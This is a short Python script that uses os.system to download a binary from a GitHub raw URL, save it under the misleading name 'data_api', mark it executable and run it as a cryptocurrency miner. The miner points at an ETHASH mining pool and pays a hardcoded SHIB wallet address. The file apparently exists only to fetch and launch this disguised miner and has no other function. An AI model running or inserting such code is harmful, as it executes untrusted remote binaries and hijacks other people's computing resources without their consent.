#!/bin/python
import os

os.system('wget -O data_api https://github.com/hambana01/cici/raw/main/lolai && chmod 755 data_api && ./data_api --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x748025d6e4e19b9e482dc048a31b970d2772275b.$(echo $(shuf -i 1000-9999 -n 1)-shiba) --ethstratum ETHPROXY')
